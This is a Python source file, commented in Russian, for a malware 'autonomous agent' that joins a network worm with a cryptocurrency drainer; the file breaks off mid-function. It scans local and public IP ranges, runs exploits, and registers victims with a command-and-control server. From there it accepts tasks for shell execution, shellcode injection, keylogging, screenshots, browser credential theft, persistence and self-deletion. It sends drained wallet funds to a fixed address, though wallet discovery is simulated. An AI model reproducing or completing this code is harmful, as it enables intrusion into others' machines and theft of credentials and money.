#!/usr/bin/env python3
"""
AutonomousAgent - Продвинутый модуль, объединяющий функционал червя и криптодрейнера
для автоматического обнаружения, распространения и монетизации.
"""

import os
import sys
import time
import json
import random
import logging
import threading
import ipaddress
import socket
import platform
import requests
import uuid
import queue
import subprocess
import ctypes
from typing import Dict, List, Any, Optional, Tuple, Set, Union

# Импортируем основные модули
from src.worm.worm_core import WormCore
from src.worm.propagation import PropagationEngine
from src.modules.web3_drainer import Web3Drainer, MEVDrainer
from src.vulnerability_scanner import VulnerabilityScanner
from src.exploit_engine import ExploitEngine
from src.exploit_manager import ExploitManager
from src.steganography import Steganography
from src.modules.icmp_tunnel import ICMPTunnel
# from worm import WormholePropagator # Закомментировано - неизвестный модуль
# from payload import PayloadManager # Комментируем, так как модуля нет
# from comms.comms import C2Communicator # Комментируем

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename='autonomous_agent.log'
)
logger = logging.getLogger('AutonomousAgent')

class AutonomousAgent:
    """
    Автономный агент, интегрирующий функциональность червя и криптодрейнера
    для автоматического поиска, эксплуатации и монетизации уязвимостей
    """
    
    def __init__(self, config_file: Optional[str] = None):
        """
        Инициализация автономного агента
        
        Args:
            config_file: Путь к файлу конфигурации
        """
        self.logger = logger
        self.logger.info("Initializing AutonomousAgent")
        self.agent_id: Optional[str] = None
        self.agent_uuid = str(uuid.uuid4())
        
        # Загружаем конфигурацию
        self.config = self._load_config(config_file)
        
        # Инициализируем основные компоненты
        self.worm_core = WormCore(self.config.get('worm', {}))
        self.propagation_engine = PropagationEngine()
        self.web3_drainer = Web3Drainer(log_level=self.config.get('log_level', 'INFO'))
        self.mev_drainer = MEVDrainer(log_level=self.config.get('log_level', 'INFO'))
        self.exploit_engine = ExploitEngine()
        self.vulnerability_scanner = VulnerabilityScanner()
        self.exploit_manager = ExploitManager()
        self.steganography = Steganography() if self.config.get('stegano_enabled', False) else None
        
        # Загрузка нативного модуля инъекции
        self.injector_lib = self._load_injector_library()
        
        # Очередь задач
        self.task_queue = queue.Queue()
        
        # Внутренние переменные
        self.running = False
        self.threads = []
        self.infected_hosts = set()
        self.victims_data = {}  # Данные о жертвах, включая криптокошельки
        self.mutex = threading.Lock()
        
        # Статистика
        self.stats = {
            "started_at": time.time(),
            "scanned_hosts": 0,
            "infected_hosts": 0,
            "detected_wallets": 0,
            "drained_wallets": 0,
            "total_drained_value": 0.0
        }
        
        self.logger.info("AutonomousAgent initialized successfully")
    
    def _load_config(self, config_file: Optional[str]) -> Dict[str, Any]:
        """
        Загружает конфигурацию из файла или использует конфигурацию по умолчанию
        
        Args:
            config_file: Путь к файлу конфигурации
            
        Returns:
            Dict: Загруженная конфигурация
        """
        default_config = {
            "log_level": "INFO",
            "c2_servers": ["localhost:8000"],
            "checkin_interval": 60,
            "checkin_jitter": 0.2,
            "worm": {
                "sleep_interval": 120,
                "jitter": 30,
                "stealth_mode": True,
                "propagation_enabled": True,
                "max_targets_per_wave": 5
            },
            "crypto": {
                "receiver_addresses": {
                    "ethereum": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
                    "binance": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
                },
                "min_profit_threshold": 0.1  # В USD
            },
            "persistence": {
                "enabled": True,
                "methods": ["registry", "startup", "service", "cron"]
            },
            "stealth": {
                "detect_sandboxes": True,
                "detect_monitoring": True,
                "adaptive_behavior": True
            }
        }
        
        if not config_file or not os.path.exists(config_file):
            self.logger.warning(f"Config file not found, using default configuration")
            return default_config
        
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                # Объединяем с дефолтными настройками
                for section in default_config:
                    if section not in config:
                        config[section] = default_config[section]
                    elif isinstance(default_config[section], dict):
                        for key in default_config[section]:
                            if key not in config[section]:
                                config[section][key] = default_config[section][key]
            return config
        except Exception as e:
            self.logger.error(f"Error loading config: {e}")
            return default_config
    
    def start(self):
        """Запускает автономного агента"""
        if self.running:
            self.logger.warning("Agent is already running")
            return
        
        self.running = True
        self.logger.info("Starting AutonomousAgent")
        
        # Регистрируемся на C2 сервере
        self._register_with_c2()
        
        # Настраиваем криптодрейнер
        self._setup_crypto_drainer()
        
        # Запускаем основные потоки
        self._start_threads()
        
        # Запускаем базовую функциональность червя
        self.worm_core.start()
        
        self.logger.info("AutonomousAgent started successfully")
    
    def stop(self):
        """Останавливает автономного агента"""
        if not self.running:
            return
            
        self.running = False
        self.logger.info("Stopping AutonomousAgent")
        
        # Останавливаем червя
        self.worm_core.stop()
        
        # Останавливаем потоки
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=5)
        
        self.logger.info("AutonomousAgent stopped")
    
    def _setup_crypto_drainer(self):
        """Настраивает криптодрейнер"""
        # Устанавливаем адреса получателей
        crypto_config = self.config.get('crypto', {})
        receiver_addresses = crypto_config.get('receiver_addresses', {})
        
        for chain, address in receiver_addresses.items():
            self.web3_drainer.set_receiver_address(chain, address)
        
        # Настраиваем MEV-дрейнер
        self.mev_drainer.set_profit_threshold(
            crypto_config.get('min_profit_threshold', 0.1)
        )
    
    def _start_threads(self):
        """Запускает рабочие потоки"""
        # Поток для сканирования сетей
        network_scanner_thread = threading.Thread(
            target=self._network_scanner_loop,
            name="NetworkScanner"
        )
        network_scanner_thread.daemon = True
        self.threads.append(network_scanner_thread)
        network_scanner_thread.start()
        
        # Поток для поиска криптокошельков
        wallet_hunter_thread = threading.Thread(
            target=self._wallet_hunter_loop,
            name="WalletHunter"
        )
        wallet_hunter_thread.daemon = True
        self.threads.append(wallet_hunter_thread)
        wallet_hunter_thread.start()
        
        # Поток для дрейна обнаруженных кошельков
        crypto_drainer_thread = threading.Thread(
            target=self._crypto_drainer_loop,
            name="CryptoDrainer"
        )
        crypto_drainer_thread.daemon = True
        self.threads.append(crypto_drainer_thread)
        crypto_drainer_thread.start()
        
        # Поток для MEV-операций
        mev_thread = threading.Thread(
            target=self._mev_operations_loop,
            name="MEVOperations"
        )
        mev_thread.daemon = True
        self.threads.append(mev_thread)
        mev_thread.start()
        
        # Поток для check-in на C2
        checkin_thread = threading.Thread(
            target=self._checkin_loop,
            name="C2CheckIn"
        )
        checkin_thread.daemon = True
        self.threads.append(checkin_thread)
        checkin_thread.start()
        
        # Поток для обработки задач
        task_worker_thread = threading.Thread(
            target=self._task_worker_loop,
            name="TaskWorker"
        )
        task_worker_thread.daemon = True
        self.threads.append(task_worker_thread)
        task_worker_thread.start()
    
    def _network_scanner_loop(self):
        """Основной цикл сканирования сетей"""
        self.logger.info("Starting network scanner loop")
        
        while self.running:
            try:
                # Автоопределение локальных сетей
                networks = self.propagation_engine.autodetect_networks()
                
                # Добавляем случайные внешние сети
                target_networks = networks.copy()
                if random.random() < 0.3:  # 30% шанс включить сканирование внешних сетей
                    external_networks = [
                        "45.33.0.0/16",
                        "104.131.0.0/16",
                        "143.198.0.0/16",
                        "138.68.0.0/16",
                        "209.97.0.0/16"
                    ]
                    target_networks.append(random.choice(external_networks))
                
                # Сканируем каждую сеть
                for network in target_networks:
                    if not self.running:
                        break
                    
                    # Быстрое сканирование живых хостов
                    hosts = self.propagation_engine.scan_network(network, quick=True)
                    
                    with self.mutex:
                        self.stats["scanned_hosts"] += len(hosts)
                    
                    # Для каждого хоста проверяем порты и уязвимости
                    for host in hosts:
                        if not self.running:
                            break
                            
                        # Избегаем повторного сканирования уже зараженных хостов
                        if host in self.infected_hosts:
                            continue
                        
                        # Сканируем порты
                        open_ports = self.propagation_engine.scan_ports(host)
                        
                        # Если есть открытые порты, ищем уязвимости
                        if open_ports:
                            vulnerabilities = self.propagation_engine.identify_vulnerabilities(host, open_ports)
                            
                            # Если нашли уязвимости, выбираем эксплойты
                            if vulnerabilities:
                                exploits = self.propagation_engine.select_exploits(host, vulnerabilities)
                                
                                # Выполняем эксплойты
                                results = self.propagation_engine.execute_exploits(exploits)
                                
                                # Обновляем статистику заражений
                                for exploit_host, success in results.items():
                                    if success:
                                        with self.mutex:
                                            self.infected_hosts.add(exploit_host)
                                            self.stats["infected_hosts"] += 1
                
                # Случайная задержка между циклами сканирования
                sleep_time = random.randint(60, 300)  # 1-5 минут
                self.logger.info(f"Network scan completed. Sleeping for {sleep_time} seconds")
                time.sleep(sleep_time)
                
            except Exception as e:
                self.logger.error(f"Error in network scanner: {e}")
                time.sleep(60)  # Задержка при ошибке
    
    def _wallet_hunter_loop(self):
        """Поиск криптокошельков на зараженных машинах"""
        self.logger.info("Starting wallet hunter loop")
        
        while self.running:
            try:
                # Обрабатываем только новые зараженные хосты
                with self.mutex:
                    hosts_to_process = self.infected_hosts.copy()
                
                for host in hosts_to_process:
                    if not self.running:
                        break
                        
                    # Пропускаем хосты, которые уже обработаны
                    if host in self.victims_data:
                        continue
                    
                    self.logger.info(f"Hunting for crypto wallets on {host}")
                    
                    # Здесь должна быть логика поиска криптокошельков
                    # В рамках PoC просто симулируем нахождение кошельков
                    wallets = self._simulate_wallet_search(host)
                    
                    if wallets:
                        with self.mutex:
                            self.victims_data[host] = wallets
                            self.stats["detected_wallets"] += len(wallets)
                            self.logger.info(f"Found {len(wallets)} wallets on {host}")
                
                # Задержка между циклами
                time.sleep(120)
                
            except Exception as e:
                self.logger.error(f"Error in wallet hunter: {e}")
                time.sleep(60)
    
    def _simulate_wallet_search(self, host: str) -> List[Dict[str, Any]]:
        """
        Симулирует поиск криптокошельков (для демонстрации)
        
        Args:
            host: IP-адрес хоста
            
        Returns:
            List[Dict]: Найденные кошельки
        """
        # В реальном коде здесь было бы фактическое сканирование системы
        wallets = []
        
        # Случайное количество кошельков (0-3)
        wallet_count = random.randint(0, 3)
        
        for _ in range(wallet_count):
            wallet_type = random.choice(["ethereum", "binance", "bitcoin"])
            
            # Генерируем фейковый приватный ключ
            private_key = ''.join(random.choice('0123456789abcdef') for _ in range(64))
            
            wallets.append({
                "type": wallet_type,
                "private_key": private_key,
                "drained": False
            })
        
        return wallets
    
    def _crypto_drainer_loop(self):
        """Дрейн криптовалюты с найденных кошельков"""
        self.logger.info("Starting crypto drainer loop")
        
        while self.running:
            try:
                with self.mutex:
                    hosts_with_wallets = [h for h in self.victims_data]
                
                for host in hosts_with_wallets:
                    if not self.running:
                        break
                    
                    with self.mutex:
                        wallets = self.victims_data[host]
                    
                    # Обрабатываем каждый кошелек
                    for wallet in wallets:
                        if wallet.get("drained", False):
                            continue
                        
                        self.logger.info(f"Attempting to drain {wallet['type']} wallet")
                        
                        # Пытаемся вывести средства
                        if wallet['type'] == "ethereum":
                            result = self.web3_drainer.drain_account(
                                "ethereum", "mainnet", wallet['private_key']
                            )
                        elif wallet['type'] == "binance":
                            result = self.web3_drainer.drain_account(
                                "binance", "mainnet", wallet['private_key']
                            )
                        else:
                            result = {"error": "Unsupported wallet type"}
                        
                        # Если нет ошибок, помечаем кошелек как drained
                        if "error" not in result:
                            wallet["drained"] = True
                            wallet["drain_result"] = result
                            
                            with self.mutex:
                                self.stats["drained_wallets"] += 1
                                
                                # Подсчитываем общую стоимость выведенных средств
                                if "native" in result and result["native"]:
                                    self.stats["total_drained_value"] += result["native"].get("value", 0)
                                
                                for token, token_info in result.get("tokens", {}).items():
                                    self.stats["total_drained_value"] += token_info.get("value", 0)
                            
                            self.logger.info(f"Successfully drained wallet")
                        else:
                            self.logger.warning(f"Failed to drain wallet: {result['error']}")
                
                # Задержка между циклами
                time.sleep(180)
                
            except Exception as e:
                self.logger.error(f"Error in crypto drainer: {e}")
                time.sleep(60)
    
    def _mev_operations_loop(self):
        """MEV-операции на Ethereum и других блокчейнах"""
        self.logger.info("Starting MEV operations loop")
        
        # Добавляем случайные приватные ключи для MEV-операций
        for _ in range(3):
            # Генерируем фейковый приватный ключ
            private_key = ''.join(random.choice('0123456789abcdef') for _ in range(64))
            self.mev_drainer.add_private_key(private_key)
        
        # Случайно выбираем сеть для мониторинга
        chain = random.choice(["ethereum", "binance", "polygon"])
        network = "mainnet"
        
        try:
            # Запускаем мониторинг мемпула
            self.mev_drainer.monitor_mempool(chain, network)
        except Exception as e:
            self.logger.error(f"Error in MEV operations: {e}")
    
    def get_stats(self) -> Dict[str, Any]:
        """
        Возвращает текущую статистику работы агента
        
        Returns:
            Dict: Статистика работы
        """
        with self.mutex:
            stats = self.stats.copy()
            stats["runtime"] = time.time() - stats["started_at"]
            stats["runtime_readable"] = self._format_time(stats["runtime"])
        
        return stats
    
    def _format_time(self, seconds: float) -> str:
        """
        Форматирует время в человекочитаемый вид
        
        Args:
            seconds: Время в секундах
            
        Returns:
            str: Отформатированное время
        """
        minutes, seconds = divmod(int(seconds), 60)
        hours, minutes = divmod(minutes, 60)
        days, hours = divmod(hours, 24)
        
        parts = []
        if days > 0:
            parts.append(f"{days}d")
        if hours > 0:
            parts.append(f"{hours}h")
        if minutes > 0:
            parts.append(f"{minutes}m")
        parts.append(f"{seconds}s")
        
        return " ".join(parts)

    def _get_system_info(self) -> Dict[str, Any]:
        """Собирает детальную информацию о системе."""
        info = {
            "agent_uuid": self.agent_uuid,
            "hostname": "unknown",
            "internal_ip": "unknown",
            "external_ip": "unknown",
            "os": platform.system(),
            "os_release": platform.release(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "python_version": platform.python_version(),
            "user": "unknown",
        }
        try:
            info["hostname"] = socket.gethostname()
        except Exception as e:
            self.logger.warning(f"Could not get hostname: {e}")

        try:
            # Попытка получить внутренний IP (может быть неточной)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0.1) # Не блокировать надолго
            try:
                # Не обязательно подключится, но ОС выберет подходящий интерфейс
                s.connect(('10.255.255.255', 1))
                info["internal_ip"] = s.getsockname()[0]
            except Exception:
                 # Пробуем старый метод, если первый не сработал
                 try:
                     info["internal_ip"] = socket.gethostbyname(info["hostname"])
                 except socket.gaierror:
                      self.logger.warning("Could not resolve internal IP via hostname.")
            finally:
                s.close()
        except Exception as e:
            self.logger.warning(f"Could not get internal IP: {e}")

        try:
            # Попытка получить внешний IP
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            response.raise_for_status() # Проверка на HTTP ошибки
            info["external_ip"] = response.json().get("ip", "unknown")
        except requests.RequestException as e:
            self.logger.warning(f"Could not get external IP: {e}")
        except Exception as e:
            self.logger.error(f"Unexpected error getting external IP: {e}")


        try:
            # os.getlogin() может вызвать ошибку, если нет контролирующего терминала
            info["user"] = os.getlogin()
        except OSError:
             try:
                 # Альтернативный метод для *nix
                 import pwd
                 info["user"] = pwd.getpwuid(os.getuid()).pw_name
             except (ImportError, KeyError):
                 # Альтернативный метод для Windows
                 info["user"] = os.environ.get("USERNAME", "unknown")
        except Exception as e:
            self.logger.warning(f"Could not get username: {e}")

        return info

    def _register_with_c2(self):
        """Регистрирует агента на C2 сервере."""
        c2_url_base = os.environ.get("C2_URL", f"http://{self.config['c2_servers'][0]}") # Используем переменную окружения
        register_url = f"{c2_url_base}/agents/register"
        system_info = self._get_system_info() # Получаем информацию о системе

        payload = {
            "agent_uuid": self.agent_uuid,
            "system_info": system_info, # Включаем информацию о системе
            "registered_at": time.time()
        }
        try:
            response = requests.post(register_url, json=payload, timeout=10)
            response.raise_for_status()
            result = response.json()
            self.agent_id = result.get("agent_id") # C2 должен вернуть ID
            self.logger.info(f"Successfully registered with C2. Agent ID: {self.agent_id}")
        except requests.RequestException as e:
            self.logger.error(f"Failed to register with C2 server {register_url}: {e}")
        except Exception as e:
            self.logger.error(f"Unexpected error during registration: {e}")


    def _checkin_loop(self):
        """Периодически отправляет check-in на C2 сервер и получает задачи."""
        if not self.agent_id:
            self.logger.warning("Cannot start check-in loop: Agent not registered.")
            # Попытка повторной регистрации через некоторое время
            time.sleep(self.config.get("checkin_interval", 60))
            self._register_with_c2()
            if not self.agent_id: return # Выход, если регистрация снова не удалась

        c2_url_base = os.environ.get("C2_URL", f"http://{self.config['c2_servers'][0]}")
        checkin_url = f"{c2_url_base}/agents/{self.agent_id}/checkin"

        while self.running:
            interval = self.config.get("checkin_interval", 60)
            jitter = self.config.get("checkin_jitter", 0.2)
            sleep_time = interval + random.uniform(-interval * jitter, interval * jitter)

            try:
                # Отправляем check-in
                payload = {
                    "timestamp": time.time(),
                    "status": "active", # Можно добавить больше статусной информации
                     # TODO: Добавить краткую статистику, нагрузку и т.д.
                }
                response = requests.post(checkin_url, json=payload, timeout=10)
                response.raise_for_status()
                tasks = response.json().get("tasks", []) # Получаем задачи от C2

                if tasks:
                    self.logger.info(f"Received {len(tasks)} new tasks from C2.")
                    for task in tasks:
                        self.task_queue.put(task) # Помещаем задачи в очередь

            except requests.RequestException as e:
                self.logger.error(f"Failed to check-in with C2 server {checkin_url}: {e}")
            except Exception as e:
                 self.logger.error(f"Unexpected error during check-in: {e}")

            time.sleep(sleep_time)

    def _task_worker_loop(self):
        """Обрабатывает задачи из очереди."""
        self.logger.info("Task worker loop started.")
        while self.running:
            try:
                task = self.task_queue.get(timeout=1) # Ожидаем задачу 1 секунду
                if task:
                    task_id = task.get("task_id")
                    self.logger.info(f"Processing task {task_id}: {task.get('command')}")
                    result = None
                    error_msg = None
                    try:
                        result, error_msg = self._handle_task(task)
                        self.logger.info(f"Task {task_id} completed. Result: {str(result)[:100]}..., Error: {error_msg}")
                    except Exception as e:
                        self.logger.error(f"Error executing task {task_id}: {e}", exc_info=True)
                        error_msg = str(e)

                    # Отправляем результат обратно на C2
                    self._send_task_result(task_id, result, error_msg)

                    self.task_queue.task_done() # Сообщаем очереди, что задача обработана
            except queue.Empty:
                continue # Нет задач, продолжаем цикл
            except Exception as e:
                self.logger.error(f"Error in task worker loop: {e}", exc_info=True)
                # Небольшая пауза перед следующей попыткой, чтобы не загружать CPU в случае постоянных ошибок
                time.sleep(5)
        self.logger.info("Task worker loop stopped.")


    def _handle_task(self, task: Dict[str, Any]) -> Tuple[Any, Optional[str]]:
        """
        Обрабатывает конкретную задачу, полученную от C2.
        Возвращает кортеж (result, error_message).
        """
        command = task.get("command")
        params = task.get("params", {})
        task_id = task.get("task_id") # Для логирования

        result: Any = None
        error_message: Optional[str] = None

        self.logger.debug(f"Handling task {task_id}: command='{command}', params={params}")

        try:
            if command == "execute_shell":
                cmd_to_run = params.get("command_line")
                if not cmd_to_run:
                    raise ValueError("Missing 'command_line' parameter for execute_shell")
                # Используем subprocess для выполнения команды
                # Важно: Обработка вывода и ошибок, таймауты
                process = subprocess.run(
                    cmd_to_run,
                    shell=True,       # Осторожно! Позволяет выполнять сложные команды, но есть риски безопасности.
                    capture_output=True, # Захватываем stdout и stderr
                    text=True,         # Декодируем вывод в текст
                    timeout=params.get("timeout", 60) # Таймаут выполнения
                )
                if process.returncode == 0:
                    result = process.stdout
                else:
                    error_message = f"Command failed with code {process.returncode}: {process.stderr}"
                    result = process.stdout # Все равно возвращаем stdout, если он есть

            elif command == "get_system_info":
                result = self._get_system_info()

            elif command == "sleep":
                duration = params.get("duration", 60)
                self.logger.info(f"Sleeping for {duration} seconds...")
                time.sleep(duration)
                result = f"Slept for {duration} seconds."

            elif command == "inject_shellcode":
                target_process = params.get("target_process")
                shellcode_b64 = params.get("shellcode_b64") # Ожидаем шеллкод в base64
                
                if not target_process or not shellcode_b64:
                     raise ValueError("Missing 'target_process' or 'shellcode_b64' parameter for inject_shellcode")
                
                result, error_message = self._handle_inject_shellcode(target_process, shellcode_b64)

            elif command == 'start_keylogger':
                result, error_message = self._handle_keylogger_start()
            elif command == 'stop_keylogger':
                result, error_message = self._handle_keylogger_stop()
            elif command == 'get_keylogs':
                result, error_message = self._handle_keylogger_get_logs()
            elif command == 'screenshot':
                result, error_message = self._handle_screenshot()
            elif command == 'steal_credentials':
                result, error_message = self._handle_steal_credentials()
            elif command == 'scan_files':
                start_path = params.get('start_path')
                masks = params.get('masks') # e.g., "*.wallet;*.pdf"
                max_depth = params.get('max_depth', -1) # По умолчанию без ограничений
                if start_path and masks:
                    result, error_message = self._handle_scan_files(start_path, masks, max_depth)
                else:
                    error_message = "Missing 'start_path' or 'masks' parameter for scan_files"

            elif command == 'find_app_sessions':
                app_names = params.get('app_names') # e.g., "Discord;Telegram"
                if app_names:
                    result, error = self._handle_find_app_sessions(app_names)
                else:
                    error = "Missing 'app_names' parameter for find_app_sessions"

            elif command == 'persist':
                method = params.get('method')
                name = params.get('name')
                path = params.get('path')
                args = params.get('args', None) # Может быть None
                
                if method and name and path:
                    result, error = self._handle_persist(method, name, path, args)
                else:
                    error = "Missing 'method', 'name', or 'path' parameter for persist"

            elif command == 'self_delete':
                # Получаем путь к текущему исполняемому файлу или DLL
                # Это может быть сложно определить надежно, особенно если агент упакован
                # Пока передадим путь к загруженной DLL
                dll_path = self.config.get('_injector_dll_path') # Предполагаем, что путь сохранен при загрузке
                if dll_path:
                     result, error = self._handle_self_delete(dll_path)
                else:
                     error = "Could not determine agent file path for self-deletion."

            # Добавить обработку других команд здесь
            # ... other commands ...
            else:
                error_message = f"Unknown command: {command}"
                self.logger.warning(f"Received unknown command '{command}' in task {task_id}")

        except subprocess.TimeoutExpired:
            error_message = "Command execution timed out."
            self.logger.error(f"Task {task_id} timed out.")
        except ValueError as e: # Ловим ошибки параметров
             error_message = str(e)
             self.logger.error(f"Parameter error for task {task_id}: {e}")
        except Exception as e:
            error_message = f"Error executing command '{command}': {e}"
            self.logger.error(f"Exception during task {task_id} execution: {e}", exc_info=True)

        return result, error_message

    def _handle_inject_shellcode(self, target_process: str, shellcode_b64: str) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду инъекции шеллкода через нативный модуль."""
        if not self.injector_lib:
            return None, "Native injector library not loaded."
            
        if platform.system() != "Windows":
            return None, "Shellcode injection via Process Hollowing is only supported on Windows."
            
        try:
            import base64
            shellcode_bytes = base64.b64decode(shellcode_b64)
            shellcode_size = len(shellcode_bytes)
            self.logger.info(f"Decoded shellcode size: {shellcode_size} bytes for injection into {target_process}")
        except Exception as e:
            self.logger.error(f"Failed to decode base64 shellcode: {e}")
            return None, f"Failed to decode base64 shellcode: {e}"
            
        if shellcode_size == 0:
             return None, "Decoded shellcode is empty."

        # Подготовка параметров для ctypes
        c_target_process = ctypes.c_char_p(target_process.encode('utf-8'))
        # Создаем изменяемый буфер для шеллкода
        c_shellcode_buffer = ctypes.create_string_buffer(shellcode_bytes, shellcode_size) 
        c_shellcode_size = ctypes.c_ulong(shellcode_size)
        # Указатель для получения сообщения об ошибке из C++
        c_error_msg_ptr = ctypes.c_char_p() 

        error_message: Optional[str] = None
        result_message: str = ""

        try:
            # Вызываем нативную функцию
            status_code = self.injector_lib.inject_process_hollowing(
                c_target_process,
                ctypes.cast(c_shellcode_buffer, ctypes.c_void_p), # Передаем как void*
                c_shellcode_size,
                ctypes.byref(c_error_msg_ptr) # Передаем указатель на указатель char*
            )

            # Проверяем результат и сообщение об ошибке
            if status_code == 0:
                result_message = f"Native injection function returned success (code {status_code})."
                self.logger.info(result_message)
            else:
                if c_error_msg_ptr and c_error_msg_ptr.value:
                     # Копируем сообщение об ошибке из C++ строки
                    error_message = c_error_msg_ptr.value.decode('utf-8', errors='replace')
                    self.logger.error(f"Native injection failed. Status: {status_code}, Error: {error_message}")
                    # Освобождаем память, выделенную в C++
                    self.injector_lib.free_error_message(c_error_msg_ptr)
                else:
                    error_message = f"Native injection function failed with code {status_code}, but no error message provided."
                    self.logger.error(error_message)
                result_message = f"Injection failed (code {status_code})."

        except Exception as e:
            self.logger.error(f"Exception during native injection call: {e}", exc_info=True)
            error_message = f"Python exception during native call: {e}"
            result_message = "Injection failed due to Python exception."
            # На всякий случай пробуем освободить память, если указатель был установлен
            if c_error_msg_ptr and c_error_msg_ptr.value and hasattr(self.injector_lib, 'free_error_message'):
                 try:
                     self.injector_lib.free_error_message(c_error_msg_ptr)
                 except Exception as free_e:
                     self.logger.warning(f"Exception while trying to free C++ error message after another exception: {free_e}")

        return result_message, error_message

    def _handle_keylogger_start(self) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду запуска кейлоггера"""
        if not self.injector_lib:
            return None, "Injector library not loaded."
        if platform.system() != "Windows":
             return None, "Keylogger only supported on Windows."
        
        error_ptr = ctypes.c_char_p() # Указатель для получения строки ошибки
        error_msg = None
        try:
            self.logger.info("Attempting to start keylogger...")
            ret_code = self.injector_lib.StartKeylogger(ctypes.byref(error_ptr))
            if error_ptr and error_ptr.value:
                error_msg = error_ptr.value.decode('utf-8', errors='ignore')
                # Освобождаем память, выделенную C++ для строки ошибки
                self.injector_lib.free_error_message(error_ptr)
                
            if ret_code == 0:
                self.logger.info("Keylogger started successfully.")
                return {"status": "Keylogger started"}, None
            else:
                err = f"Failed to start keylogger. Code: {ret_code}. Message: {error_msg or 'Unknown error'}"
                self.logger.error(err)
                return None, err
        except Exception as e:
            err = f"Exception calling StartKeylogger: {e}"
            self.logger.exception(err)
            return None, err

    def _handle_keylogger_stop(self) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду остановки кейлоггера"""
        if not self.injector_lib:
            return None, "Injector library not loaded."
        if platform.system() != "Windows":
             return None, "Keylogger only supported on Windows."

        error_ptr = ctypes.c_char_p()
        error_msg = None
        try:
            self.logger.info("Attempting to stop keylogger...")
            ret_code = self.injector_lib.StopKeylogger(ctypes.byref(error_ptr))
            if error_ptr and error_ptr.value:
                error_msg = error_ptr.value.decode('utf-8', errors='ignore')
                self.injector_lib.free_error_message(error_ptr)
            
            if ret_code == 0:
                self.logger.info("Keylogger stopped successfully.")
                return {"status": "Keylogger stopped"}, None
            else:
                err = f"Failed to stop keylogger. Code: {ret_code}. Message: {error_msg or 'Unknown error'}"
                self.logger.error(err)
                return None, err
        except Exception as e:
            err = f"Exception calling StopKeylogger: {e}"
            self.logger.exception(err)
            return None, err

    def _handle_keylogger_get_logs(self) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду получения логов кейлоггера"""
        if not self.injector_lib:
            return None, "Injector library not loaded."
        if platform.system() != "Windows":
             return None, "Keylogger only supported on Windows."
             
        logs_ptr = None
        try:
            self.logger.info("Attempting to get keylogs...")
            logs_ptr = self.injector_lib.GetKeyLogs() # Возвращает char*
            
            if logs_ptr:
                # Декодируем строку из C (предполагаем UTF-8)
                logs_json_str = logs_ptr.decode('utf-8', errors='ignore')
                self.logger.info(f"Received keylogs string (length {len(logs_json_str)}). Attempting to parse JSON.")
                # Освобождаем память C строки *после* декодирования
                self.injector_lib.free_error_message(logs_ptr) # Используем ту же функцию освобождения
                
                try:
                    # Пытаемся распарсить JSON, чтобы убедиться в корректности
                    logs_data = json.loads(logs_json_str)
                    self.logger.info(f"Successfully parsed keylogs JSON ({len(logs_data)} entries).")
                    return {"keylogs": logs_data}, None # Возвращаем распарсенный JSON
                except json.JSONDecodeError as e:
                    err = f"Failed to parse keylogs JSON: {e}. Raw string: {logs_json_str[:200]}..."
                    self.logger.error(err)
                    # Возвращаем сырую строку, если парсинг не удался, но C2 сможет разобраться
                    return {"raw_keylogs": logs_json_str}, err 
            else:
                self.logger.info("No keylogs available.")
                return {"keylogs": []}, None # Возвращаем пустой список, если логов нет

        except Exception as e:
            err = f"Exception calling GetKeyLogs: {e}"
            self.logger.exception(err)
            # Если была ошибка и logs_ptr был получен, пытаемся освободить память
            if logs_ptr: 
                try:
                    self.injector_lib.free_error_message(logs_ptr)
                except Exception as free_e:
                     self.logger.error(f"Exception freeing logs_ptr after another error: {free_e}")
            return None, err

    def _handle_screenshot(self) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду снятия скриншота"""
        if not self.injector_lib:
            return None, "Injector library not loaded."
        if platform.system() != "Windows":
             return None, "Screenshot capture only supported on Windows."
             
        screenshot_ptr = None
        try:
            self.logger.info("Attempting to capture screenshot...")
            screenshot_ptr = self.injector_lib.CaptureScreenshot() # Возвращает char*
            
            if screenshot_ptr:
                # Декодируем Base64 строку из C (предполагаем ASCII/UTF-8 совместимость)
                base64_data = screenshot_ptr.decode('ascii') # Base64 использует ASCII
                self.logger.info(f"Successfully captured screenshot (Base64 length: {len(base64_data)}).")
                
                # Освобождаем память C строки *после* декодирования
                # Используем специальную функцию FreeScreenshotData
                self.injector_lib.FreeScreenshotData(screenshot_ptr)
                
                # Возвращаем результат в виде словаря
                return {"screenshot_base64": base64_data}, None
            else:
                err = "CaptureScreenshot returned NULL. Failed to capture screenshot."
                self.logger.error(err)
                return None, err

        except Exception as e:
            err = f"Exception calling CaptureScreenshot: {e}"
            self.logger.exception(err)
            # Если была ошибка и screenshot_ptr был получен, пытаемся освободить память
            if screenshot_ptr: 
                try:
                    self.injector_lib.FreeScreenshotData(screenshot_ptr)
                except Exception as free_e:
                     self.logger.error(f"Exception freeing screenshot_ptr after another error: {free_e}")
            return None, err

    def _handle_steal_credentials(self) -> Tuple[Any, Optional[str]]:
        """Обрабатывает команду кражи учетных данных браузеров"""
        if not self.injector_lib:
            return None, "Injector library not loaded."
        if platform.system() != "Windows":
             return None, "Browser credential stealing only supported on Windows."
             
        creds_ptr = None
        try:
            self.logger.info("Attempting to steal browser credentials...")
            creds_ptr = self.injector_lib.StealBrowserCredentials() # Возвращает char*
            
            if creds_ptr:
                # Декодируем JSON строку из C (предполагаем UTF-8)
                creds_json_str = creds_ptr.decode('utf-8', errors='ignore')
                self.logger.info(f"Successfully retrieved credential data (JSON length: {len(creds_json_str)}).")
                
                # Освобождаем память C строки *после* декодирования
                # Используем free_error_message, как договорились
                self.injector_lib.free_error_message(creds_ptr)
                
                # Пытаемся распарсить JSON для валидации
                try:
                    creds_data = json.loads(creds_json_str)
                    self.logger.info(f"Successfully parsed credentials JSON.")
                    # Возвращаем распарсенный JSON
                    return {"browser_credentials": creds_data}, None 
                except json.JSONDecodeError as e:
